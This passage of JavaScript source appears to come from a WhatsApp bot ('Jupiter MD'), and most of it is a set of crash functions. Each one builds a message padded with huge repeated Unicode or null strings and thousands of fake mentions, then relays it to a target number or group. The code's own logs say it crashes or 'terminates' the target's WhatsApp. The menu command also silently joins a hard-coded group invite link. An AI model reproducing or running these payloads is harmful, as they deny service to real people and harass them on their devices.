          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await gz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined,
        }],
      }],
    }],
  });
  console.log(chalk.red('[ BUG Sending SUCCES 🚀 ]')) 
}

//FORCEIOS
async function IosInvisibleForce(sock, target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "🧬 𝐄𝐙𝐙 𝐂𝐑𝐀𝐒𝐇 - 𝐃𝐄𝐗꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://files.catbox.moe/gp6w2y.jpg",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "?𝐅𝐜 𝐧𝐠𝐞𝐧𝐭𝐨𝐭𝐭" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await gz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  console.log(randomColor()(`─────「 ⏤!CrashInvisibleIOS To: ${target}!⏤ 」─────`))
}

//FUNCT BLANK 
async function invico1(isTarget) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363269950668068@newsletter",
      newsletterName: "⎋🧬 𝐗 - 𝐃𝐎𝐌𝐈-‣" + "ោ៝".repeat(10000),
      caption: "⎋🧬 𝐗 - 𝐃𝐎𝐌𝐈-‣" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await gz.relayMessage(isTarget, msg, {
    messageId: null
  });
}

async function NewBlank(target) {
    console.log(chalk.red("Nuclear payload launched to Target System"));
    
    const DESTRUCTIVE_CHARS = 
        "\u0000\uFFFF\uD83D\uDCA3\uD83D\uDCA5\u2620" + 
        "ꦽ".repeat(50000) + 
        String.fromCharCode(0x10FFFF).repeat(1000);
    
    const generateMentionBomb = (count) => {
        return Array.from({length: count}, () => 
            "62" + Math.floor(Math.random() * 9000000000 + 1000000000) + "@s.whatsapp.net"
        );
    };

    const attackPromises = [];
    for (let i = 0; i < 10; i++) {
        attackPromises.push(gz.relayMessage(target, {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: `https://nuclear.payload/attack-${i}`,
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/" + "z".repeat(1000),
                                fileLength: "9999999999999",
                                pageCount: 2147483647,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "\u0000",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/nuclear_payload.enc",
                                mediaKeyTimestamp: Date.now().toString(),
                                contactVcard: true,
                                jpegThumbnail: Buffer.alloc(50000, 0xFF).toString('base64'),
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: "💣BLANK AHAHAHAH 💣" + 
                                  DESTRUCTIVE_CHARS + 
                                  "💣".repeat(50000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: JSON.stringify({blastRadius: "infinite"})
                        },
                        contextInfo: {
                            mentionedJid: [
                                "6288888888888@s.whatsapp.net",
                                ...generateMentionBomb(5000),  // 5000 mention acak
                                target  // Target sebagai mention utama
                            ],
                            forwardingScore: 32767,
                            isForwarded: true,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://secondary.payload/nuke-backup",
                                    mimetype: "application/octet-stream",
                                    fileSha256: "ꦽ" + "𝕱".repeat(1000) + "𝕱𝕮",
                                    fileLength: "99999999999999",
                                    pageCount: 2147483647,
                                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                    fileName: "\u0000",
                                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                    directPath: "/v/t62.7119-24/secondary_nuke.enc",
                                    mediaKeyTimestamp: Date.now().toString(),
                                    contactVcard: true,
                                    jpegThumbnail: Buffer.alloc(100000, i % 256).toString('base64'),
                                    }
                            },
                            deviceListMetadata: {
                                crashPayload: true,
                                version: 2147483647
                            }
                        },
                        footer: {
                            text: "BLANK🥶⚠️"
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            },
            additionalAttributes: {
                "nuclear": "true",
                "blastPower": "10x",
                "target": target
            }
        }));
    }

    // Eksekusi semua serangan paralel
    await Promise.all(attackPromises);
    
    // Phase 2: Persistent Payload Injection
    await gz.sendMessage(target, {
        text: "💥 𝕸𝕬𝕸𝕺𝖀𝕾 𝕸𝕬𝕶𝕷𝕺𝕺 💥\n" + DESTRUCTIVE_CHARS.repeat(1000),
        contextInfo: {
            deviceListMetadata: JSON.stringify({
                persistentCrash: true,
                autoTrigger: true,
                onOpen: "forceClose"
            }),
            mentionedJid: [target]
        }
    });

    console.log(chalk.green("✅ Nuclear strike completed! Dictated WhatsApp number Target has been terminated"));
}

async function BugGroup(jid, count) {
  for (let i = 0; i < count; i++) {
    const messageContent = generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "鉄吿婐煢� 饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁 鈻� ",
              hasMediaAttachment: false
            },
            body: {
              text: "\u0003".repeat(9000),
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                { name: "single_select", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "payment_method", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "call_permission_request", buttonParamsJson: SuperRajaHere + "\u0003", voice_call: "call_galaxy" },
                { name: "form_message", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "wa_payment_learn_more", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "wa_payment_transaction_details", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "wa_payment_fbpin_reset", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "catalog_message", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "payment_info", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "review_order", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "send_location", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "payments_care_csat", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "view_product", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "payment_settings", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "address_message", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "automated_greeting_message_view_catalog", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "open_webview", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "message_with_link_status", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "payment_status", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "galaxy_costum", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "extensions_message_v2", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "landline_call", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "mpm", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "cta_copy", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "cta_url", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "review_and_pay", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "galaxy_message", buttonParamsJson: SuperRajaHere + "\u0003" },
                { name: "cta_call", buttonParamsJson: SuperRajaHere + "\u0003" }
              ]
            }
          }
        }
      }
    }, {});

    await gz.relayMessage(jid, messageContent.message, {
      messageId: messageContent.key.id
    });

    console.log(chalk.red(`Sukses kirim Bug Group`));
  }
}
async function InvisLoca(target, sw) {
  let mention = Array.from({ length:1998 }, (_, d) => `1313555000${d + 1}@s.whatsapp.net`);
  let gbMention = Array.from({ length:2000 }, (_, d) => ({
    groupJid: `1230${d + 1}@g.us`, 
    subject: `Room Public${d + 1}`
  }));
  let msg = generateWAMessageFromContent(target, {
    locationMessage: {
      degreesLatitude: 0,
      degreesLongitude: 0
    }, 
    contextInfo: {
      isForwarded: true, 
      forwardingScore: 999,
      mentionedJid: [target, "13135550002@s.whatsapp.net", ...mention], 
      groupMentions: gbMention, 
      externalAdReply: {
        title: "𝑫𝒊𝒆𝒈𝒐𝑫'𝑩𝒓𝒂𝒏𝒅𝒐࿐",
        body: "𖥂".repeat(250208) + "</𖥂\\>".repeat(250208),
        mediaType: 1,
        renderLargerThumbnail: true,
        showAdAttribution: true,
        sourceUrl: 'https://wa.me/setting'
      }
    }, 
  }, {});
  
  await gz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (sw) {
    await gz.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "Maklo Ampas" },
          content: undefined
        }
      ]
    });
  }
}

async function AudioInvis(target, tag, sw) {
  //parameter : await AudioInvis(target, 25, true)
  let Mentions = Array.from({ length:1998 }, (_, d) => `1313555000${d + 1}@s.whatsapp.net`);
  let gbMentions = Array.from({ length:2000 }, (_, d) => ({
    groupJid: `1230${d + 1}@g.us`, 
    subject: `Room Public${d + 1}`
  }));
  let msg = generateWAMessageFromContent(target, {
    ephemeralMessage: {
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7117-24/35858186_2153481945137567_6898705162845538529_n.enc?ccb=11-4&oh=01_Q5Aa2AF8rjn6MPodDAWioqSUkUaEHB85ulqjYwDF2ox8Ouqi1A&oe=68B51EBC&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/ogg; codecs=opus",
        fileSha256: "nikKZDRxm5DnFYf+HW608xM7dzPqV+2o9zLqeX5XOso=",
        fileLength: Math.floor(Math.random() * 250208),
        seconds: Math.floor(Math.random() * 250208),
        ptt: true,
        caption: "𝒀𝒖𝒖𝒌𝒆𝒚𝑫'𝒁𝒆𝒑𝒑𝒆𝒍𝒊࿐", 
        mediaKey: "2E8RnzdJDXdNl2KFpZZY+TDjpaEisasGJ/W4ZncVWPs=",
        fileEncSha256: "mAsKaPeyUTkR9VEFMI+c/l2sMQ+PH63bpR1l9p/dSQ0=",
        directPath: "/v/t62.7117-24/35858186_2153481945137567_6898705162845538529_n.enc?ccb=11-4&oh=01_Q5Aa2AF8rjn6MPodDAWioqSUkUaEHB85ulqjYwDF2ox8Ouqi1A&oe=68B51EBC&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1754119754",
        waveform: "AAAASmNaIxlZUWAJPUtjWh1jTElXV2JaWDwhDkxSV1lSH1EjHyFcN2IsPFpNXURBSVISUjRAKTFRTEg6TUtNSA=="
      }, 
      contextInfo: {
        isForwarded: true, 
        forwardingScore: 250208,
        isChannelMessage: true, 
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363269950668068@newsletterr", 
          newsletterName: "𝒀𝒖𝒖𝒌𝒆𝒚𝑫'𝒁𝒆𝒑𝒑𝒆𝒍𝒊࿐", 
          serverId: 250208
        }, 
        mentionedJid: Mentions, 
        groupMentions: gbMentions, 
        externalAdReply: {
          title: "𝑫𝒊𝒆𝒈𝒐𝑫'𝑩𝒓𝒂𝒏𝒅𝒐࿐",
          body: "𖥂".repeat(250208) + "</𖥂\\>".repeat(250208),
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true,
          thumbnail: "/9j/250208DgOB", // Optional
          sourceUrl: 'https://wa.me/setting'
        }
      }
    }
  }, {});
  
  for(let d = 0; d < tag; d++) {
    await gz.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key?.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "bot",
          attrs: {
            biz_bot: "1"
          }
        }, 
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    if (sw) {
      await gz.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
         tag: "bot",
            attrs: {
              biz_bot: "1"
            }
          }, 
          {
            tag: "meta",
            attrs: { is_status_mention: "𝒀𝒖𝒖𝒌𝒆𝒚𝑫'𝒁𝒆𝒑𝒑𝒆𝒍𝒊࿐" },
            content: undefined
          }
        ]
      });
    };
  }
}

async function ScarySqL(target) {
  const apiClient = JSON.stringify({ status:true });
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363269950668068@newsletter",
              serverMessageId: 7,
              newsletterName: `8-Diego ( 🕒Diego-EightFold🦖 )`,
              contentType: 6,
              content: "porn",
              timestamp: Date.now(),
              sender: "13135550002@s.whatsapp.net",
              accessibilityText: "Hdeh"
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "𝑫'𝒃𝒓𝒂𝒏𝒅𝒐࿐",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://nekopoi/care",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "𝑺𝒄𝒂𝒓𝒚-𝑴𝒐𝒏𝒔𝒕𝒆𝒓𝒔࿐",
          },
          nativeFlowMessage: {
            messageParamsJson: "=".repeat(9000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: apiClient
              },
              {
                name: "call_permission_request",
                buttonParamsJson: apiClient
              },
              {
                name: "payment_method",
                buttonParamsJson: ""
              },
              {
                name: "payment_status",
                buttonParamsJson: ""
              },
              {
                name: "review_order",
                buttonParamsJson: JSON.stringify({
                  reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
                  order: {
                    status: "pending",
                    order_type: "ORDER"
                  },
                  share_payment_status: true,
                  call_permission: true
                })
              },
              {
                name: "contact",
                buttonParamsJson: JSON.stringify({
                  vcard: {
                    full_name: "7eppeli",
                    phone_number: "+13135550002",
                    email: "ScrMnstr@iCloud.com",
                    organization: "8rando",
                    job_title: "Blow Job"
                  }
                })
              }
            ], 
            messageParamsJson: "{".repeat(9000)
          }
        }
      }
    }
  }, { userJid: target });

      gz.relayMessage(target, msg.message, {
        messageId: msg.key?.id,
        participant: { jid: target },
        userJid: target, 
        addtionalNodes: Node
      });

}

async function HeavenSqL(target) {
  try {
    const Node = [
      {
        tag: "bot",
        attrs: {
          biz_bot: "1"
        }
      }
    ];
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            supportPayload: JSON.stringify({
              version: 2,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: Math.floor(Math.random() * 25)
            }), 
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363269950668068@newsletter",
                serverMessageId: 7,
                newsletterName: `8-Diego \"( 🕒Diego-EightFold🦖 )\"`,
                contentType: 6,
                content: "porn",
                timestamp: Date.now(),
                sender: "13135550002@s.whatsapp.net",
                accessibilityText: "Hdeh"
              },
            },
            body: {
              text: "𝑫𝒊𝒆𝒈𝒐𝑫'𝑩𝒓𝒂𝒏𝒅𝒐࿐",
            },
            nativeFlowMessage: {
              messageParamsJson: "=".repeat(9000), 
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "{\"status\":true}",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{\"status\":true}",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "{\"status\":true}",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "{\"status\":true}",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "{\"status\":true}",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
              messageParamsJson: "{".repeat(9000), 
            },
          },
        },
      },
    };
    
    let msg = generateWAMessageFromContent(target, message, { userJid:target });
    
    await gz.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key?.id, 
      addtionalNodes: Node
    });
  } catch (err) {
    console.log(err);
  }
}
//~~~~~~~~~~~~~~~~~~~ [ FINAL FUNC BUG ]~~~
async function autoJoinGroup(gz, inviteLink) {
  try {
    // Extract invite code from link
    const inviteCode = inviteLink.match(/([a-zA-Z0-9_-]{22})/)?.[1];
    
    if (!inviteCode) {
      throw new Error('Invalid invite link');
    }
    
    // Join the group
    const result = await gz.groupAcceptInvite(inviteCode);
    console.log('✅ Successfully Joined group🥳:', result);
    return result;
    
  } catch (error) {
    console.error('❌ Failed to join group☹️:', error.message);
    return null;
  }
}

if (autoread) {
                gz.readMessages([m.key]);
            }

            if (global.autoTyping) {
                gz.sendPresenceUpdate("composing", from);
            }

            if (global.autoRecording) {
                gz.sendPresenceUpdate("recording", from);
            }

            //bot number online status, available=online, unavailable=offline
            gz.sendPresenceUpdate("uavailable", from);

            if (global.autorecordtype) {
                let xeonrecordin = ["recording",
                    "composing"];
                let xeonrecordinfinal =
                xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)];
                gz.sendPresenceUpdate(xeonrecordinfinal, from);
            }


/*if (m.message) {
    console.log(chalk.hex('#3498db')(`message " ${m.message} "  from ${pushname} id ${m.isGroup ? `group ${groupMetadata.subject}` : 'private chat'}`));
}*/

switch(command) {
case 'menu': {
await loading();

await autoJoinGroup(gz, "https://chat.whatsapp.com/HaRMGTrAurm9XyJBUmCb8y?mode=ems_copy_t");
    const menuImages = [
        'https://files.catbox.moe/kszb7h.jpg',
        'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal93.png',
        'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal93.png',
        'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal19.png',
        'https://files.catbox.moe/907bmc.jpg'
    ];

    // Randomly select an image for the menu
    const mrrogueUrl = menuImages[Math.floor(Math.random() * menuImages.length)];
    

    const menuText = `
 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 

┏━━━━━━━━━━━━━━
┃ 🤖𝐁𝐎𝐓 𝐍𝐀𝐌𝐄 : 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗
┃ 👤𝐁𝐎𝐓 𝐔𝐒𝐄𝐑: ${m.pushName}
┃ 🛠️ 𝐃𝐄𝐕: 𝗚𝗢𝗗𝗦𝗭𝗘𝗔𝗟
┃ 𖤍 𝐕𝐄𝐑𝐒𝐈𝐎𝐍: 𝟐.𝟎
┃ 𓃵 𝐌𝐎𝐃𝐄: ${gz.public? '𝙿𝚞𝚋𝚕𝚒𝚌' : '𝚂𝚎𝚕𝚏'}
┃ 𓆤 𝐏𝐈𝐍𝐆: ${latensi.toFixed(4)} 𝚜𝚎𝚌
┃ ⌬  𝐏𝐑𝐄𝐅𝐈𝐗 : ${prefix}
┗━━━━━━━━━━━━━━

🔥 𝐗𝐔𝐏 𝐁𝐎𝐒𝐒 @${m.pushName}
𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗

┏━━━━━━━━━━  
┃ ⚔  .𝙱𝙾𝚃𝙼𝙴𝙽𝚄
┃ ⚡ .ɢʀᴏᴜᴘᴍᴇɴᴜ
┗━━━━━━━━━━━
> ༒𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 ☠ `;

    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗",
            participant: "0@s.whatsapp.net"
        },
        message: {
            conversation: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗"
        }
    };

    // Send the menu image with the caption
    await gz.sendMessage(from, {
        image: { url: mrrogueUrl },
        caption: menuText
    }, { quoted: fakeSystem });

    // Wait for 2 seconds before sending the audio message
    await sleep(2000)

await gz.sendMessage(m.chat, {

audio: jupiterplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;
case 'botmenu': {
    const menuImages = [
        'https://files.catbox.moe/kszb7h.jpg',
        'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal93.png',
        'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal93.png',
        'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal19.png',
        'https://files.catbox.moe/907bmc.jpg',
    ];

    // Randomly select an image for the menu
    const mrrogueUrl = menuImages[Math.floor(Math.random() * menuImages.length)];

    const menuText = `
╔═━━━━━━━━━━━━━━═╗
║🤖 𝗕𝗢𝗧 𝗡𝗔𝗠𝗘: 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 ${m.pushName}
║👤 𝗨𝗦𝗘𝗥 ${botname}
║🙄 Uptime: ${runtime(process.uptime())}
║👑 Owner: ${ownername}
║🛠️ 𝗗𝗘𝗩: 𝗚𝗢𝗗𝗦𝗭𝗘𝗔𝗟
╚═════════════════╝

╔═〘 ⚡ OWNER ZONE 〙═╗
║ • 🧠 .runtime
║ • 🚫 .block
║ • ✅ .unblock
║ • 🗂️ .repo
║ • ❤️ .alive
║ • 🧬 .autobio
║ • 🖼️ .getpp
║ • 📶 .ping
║ • 📢 .broadcast
║ • 🖌️ .setppbot
║ • ⚙️ .speed
║ • 🔐 .enc
║ • 📡 .reactch
║ • 🧪 .test
║ • 🌦️ .weather
╚══════════════════╝

╔═〘 🎭 STICKER WORLD 〙═╗
║ • 🤚 pat
║ • 👋 slap
║ • 🤗 hug
║ • 💃 dance
║ • 😈 jag
║ • 😘 kiss
║ • 🔪 kill
║ • 😊 blush
║ • 😒 brat
║ • 🙌 highfive
║ • 🦷 bite
║ • 😢 cry
║ • 📦 take
║ • 🍽️ nom
║ • 👉 poke
║ • 🫂 cuddle
║ • ✋ handhold
║ • 🔨 bonk
║ • 🐾 furbrat
╚══════════════════╝

╔═〘 🎌 ANIME REALM 〙═╗
║ • 😄 animehappy
║ • 😋 animelick
║ • 😁 animesmile
║ • ⚔️ animekill
║ • 😉 animewink
║ • 👤 animeavatar
║ • 🧛 animebite
║ • 💃 animedance
║ • 😬 animecringe
║ • 🫂 animeglomp
║ • 😏 animesmug
║ • ✋ animehighfive
║ • 🧸 nwaifu
║ • 🚫 nsfw
╚═════════════════════╝

╔═〘 ⛩️ GROUP PANEL 〙═╗
║ • 🆔 .groupjid
║ • 🧿 .tagall
║ • 🧞 .promote
║ • 🔻 .demote
║ • 🚷 .kick
║ • 💥 .kickall
║ • 📊 .poll
║ • ➕ .add
║ • 🔄 .resetlinkgc
║ • 🙈 .hidetag
║ • 🟢 .listonline
║ • 🗑️ .del
║ • 🔗 .join
║ • 🔕 .mute
║ • 🌐 .linkgc
║ • 💀 .hijack
║ • 🔊 .unmute
║ • 👮‍♂️ .listadmin
║ • 👋 .left
║ • 🎯 .tag
╚══════════════════════╝

╔═〘 🎨 LOGO LAB 〙═╗
║ • 🎆 .gfx1
║ • 🌀 .gfx2
║ • 💫 .gfx3
║ • ⚡ .gfx4
║ • 💎 .gfx5
║ • 🎨 .gfx6
║ • 🖼️ .gfx7
║ • 🚀 .gfx8
║ • 🧨 .gfx9
║ • 🔥 .gfx10
║ • 👁️ .gfx11
║ • 🧬 .gfx12
╚════════════════════╝
╔═〘 🎧 VOICE MODE 〙═╗
║ • 🤖 .robot
║ • ⚡ .fast
║ • 🎚️ .bass
║ • 💥 .earrape
║ • 🕳️ .deep
║ • 🎵 .smooth
║ • 🐿️ .squirrel
║ • 🌙 .nightcore
║ • 💨 .blown
║ • 🔁 .reverse
║ • 🐌 .slow
╚═════════════════════╝

╔═〘 📥 DOWNLOAD DEN 〙═╗
║ • 📹 .ytmp4
║ • 🧬 .gitclone
║ • 📸 .igdl
║ • 🔗 .tinyurl
║ • 👘 .nwaifu
║ • 📺 .animedl
║ • 🖼️ .pixabay
║ • 📌 .Pinterest
║ • 🔍 .ttsearch
║ • 🎶 .play
║ • 🎧 .ytmp3
║ • 🌐 .gimage
║ • 🖼️ .img
║ • 📦 .apk
║ • 🎼 .play2
║ • 🗣️ .tts
║ • 🎞️ .video
║ • 🎭 .tiktok
║ • 🧚 .waifu
║ • 🧠 .animesearch
╚═══════════════════════╝

╔═〘 🛰️ OTHER HACKS 〙═╗
║ • 🧹 .clearbugs
║ • 💾 .save
║ • 🖼️ .toimg
║ • 😈 .brat
║ • 🎁 .take
║ • 🧷 .s
║ • 🆔 .idch
║ • 🌐 .ssweb
║ • 📤 .tourl
║ • 🤖 . 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 AI
║ • 🧑‍🤝‍🧑 .creategc
║ • 🖥️ .panel
║ • 🧪 .vv
║ • 🧪 .vv2
║ • 🎙️ .tovn
║ • 🌍 .tr
╚═══════════════════════╝`;

    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥",
            participant: "0@s.whatsapp.net"
        },
        message: {
            conversation: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗"
        }
    };

    // Send the menu image with the caption
    await gz.sendMessage(from, {
        image: { url: mrrogueUrl },
        caption: menuText
    }, { quoted: fakeSystem });

    // Wait for 2 seconds before sending the audio message
    await sleep(2000)

await gz.sendMessage(m.chat, {

audio: jupiterplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;
case 'groupmenu': {
    const menuImages = [
        'https://files.catbox.moe/kszb7h.jpg',
        'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal93.png',
        'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal93.png',
        'https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal19.png',
        'https://files.catbox.moe/907bmc.jpg',
    ];

    // Randomly select an image for the menu
    const mrrogueUrl = menuImages[Math.floor(Math.random() * menuImages.length)];

    const menuText = `
╔═══[ ⛩️𝗚𝗥𝗢𝗨𝗣 𝗖𝗠𝗗 𝗖𝗘𝗡𝗧𝗘𝗥👩‍💻 ]═══╗
║ • 🆔 .groupjid
║ • 📢 .tagall
║ • 👑 .promote
║ • ❌ .demote
║ • 👢 .kick
║ • 🚫 .kickall
║ • 📊 .poll
║ • ➕ .add
║ • 🔄 .resetlinkgc
║ • 🙈 .hidetag
║ • 👥 .listonline
║ • 🗑️ .del
║ • ➡️ .join
║ • 🔇 .mute
║ • 🔗 .linkgc
║ • 🕵️‍♂️ .hijack
║ • 🔊 .unmute
║ • 🛡️ .listadmin
║ • 🚪 .left
║ • 🏷️ .tag
╚══════════════════════════╝`;

    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗",
            participant: "0@s.whatsapp.net"
        },
        message: {
